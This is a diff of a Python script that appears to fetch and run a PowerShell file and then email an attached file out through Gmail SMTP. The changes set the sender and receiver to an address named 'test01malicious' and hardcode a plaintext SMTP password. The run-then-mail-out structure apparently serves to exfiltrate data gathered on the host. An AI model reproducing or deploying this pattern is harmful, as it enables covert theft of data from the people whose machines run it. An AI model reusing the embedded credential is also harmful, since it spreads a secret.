@@ -38,8 +38,8 @@ def exec_ps():
 
 
 def send_mail(sender,receiver):
-	from_mail = "gulferdi.software@gmail.com"
-	to_mail   = "gulferdi.software@gmail.com"
+	from_mail = "test01malicious@gmail.com"
+	to_mail   = "test01malicious@gmail.com"
 	message   = MIMEMultipart() 
 	message['From'] = from_mail
 	message['To'] = to_mail
@@ -56,7 +56,7 @@ def send_mail(sender,receiver):
 	message.attach(getFile) 
 	smtp = smtplib.SMTP('smtp.gmail.com', 587) 
 	smtp.starttls() 
-	smtp.login(from_mail, <password>) 
+	smtp.login(from_mail, "2012010213004" ) 
 	text = message.as_string() 
 	smtp.sendmail(from_mail, to_mail, text) 
 	smtp.quit() 
@@ -65,7 +65,7 @@ if __name__=="__main__":
 	
 	get_psfile()
 	exec_ps()
-	sender="gulferdi.software@gmail.com"
-	receiver="gulferdi.software@gmail.com"
+	sender="test01malicious@gmail.com"
+	receiver="test01malicious@gmail.com"
 	send_mail(sender,receiver)
 
